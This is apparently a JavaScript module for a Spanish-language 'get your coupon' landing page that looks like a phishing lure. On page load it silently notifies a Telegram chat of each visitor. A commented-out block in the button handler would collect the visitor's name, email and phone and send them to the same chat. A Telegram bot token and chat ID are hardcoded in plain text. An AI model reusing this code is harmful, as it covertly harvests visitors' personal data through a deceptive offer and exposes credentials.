import { initRouter } from "../router.js";

export default function Home() {
    console.log("CDN cargado correctamente.");

    // Crear el elemento <title>
    const titleElement = document.createElement("title");
    titleElement.textContent = "¡Obtén Tu Cupón!";
    document.head.appendChild(titleElement);

    // Crear un estilo global y agregarlo al head
    const style = document.createElement("style");
    style.textContent = `
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; font-family: Arial, sans-serif; }
        body {
            display: flex; align-items: center; justify-content: center;
            background: url("https://i.imgur.com/K4ffkXt.jpeg") no-repeat center center / cover;
        }
        .container { min-height: 80vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .form-wrapper {
            font-size: 18px; background: rgba(255, 255, 255, 0.85);
            border-radius: 20px; padding: 50px 40px; max-width: 700px; width: 100%;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); text-align: center;
        }
        .form-wrapper h1 { margin-bottom: 20px; color: #333; font-weight: bold; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; text-align: left; }
        input {
            width: 100%; margin-bottom: 16px; padding: 14px;
            border-radius: 5px; border: 1px solid #ccc; font-size: 16px;
        }
        .submit-button {
            background: linear-gradient(45deg, #f70000, #ff0000);
            border: none; border-radius: 25px; color: #fff; cursor: pointer;
            font-size: 18px; font-weight: bold; margin-top: 10px; padding: 15px 30px;
            transition: transform 0.3s, box-shadow 0.3s; width: 100%;
        }
        .submit-button:hover { transform: translateY(-3px); box-shadow: 0 5px 20px rgba(142, 68, 173, 0.5); }
    `;
    document.head.appendChild(style);

    // Enviar mensaje a Telegram cuando se carga la página
    sendTelegramMessage("📢 Un usuario ha ingresado a la página de cupones.");

    return `
    <div class="container">
        <div class="form-wrapper">
            <h1>Completa tus datos para obtener tu cupón</h1>
            <div id="couponForm">
                <button type="button" class="submit-button" id="submitBtn">Recibir mi cupón</button>
            </div>
        </div>
    </div>`;
}

export function addHomeEvents() {
    document.getElementById("submitBtn").addEventListener("click", async function () {
     /*    const nombre = document.getElementById("nombre").value;
        const correo = document.getElementById("correo").value;
        const telefono = document.getElementById("telefono").value;

        if (!nombre || !correo || !telefono) {
            alert("Por favor, completa todos los campos.");
            return;
        }

        const mensaje = `✈️ NUEVO REGISTRO:\n👤 Nombre: ${nombre}\n📩 Correo: ${correo}\n📟 Teléfono: ${telefono}`;
        await sendTelegramMessage(mensaje); */

        history.pushState(null, "", "/gracias");
        initRouter();
    });
}

async function sendTelegramMessage(text) {
    const botToken = "7959584991:AAEuDqY8YuOraJYWtpN0tdxWX_TquHkepJE";
    const chatId = "6298387261";
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(apiUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text })
        });

        if (!response.ok) {
            throw new Error(`Error al enviar el mensaje: ${response.statusText}`);
        }
        console.log("Mensaje enviado a Telegram:", text);
    } catch (error) {
        console.error("Error al enviar mensaje a Telegram:", error);
    }
}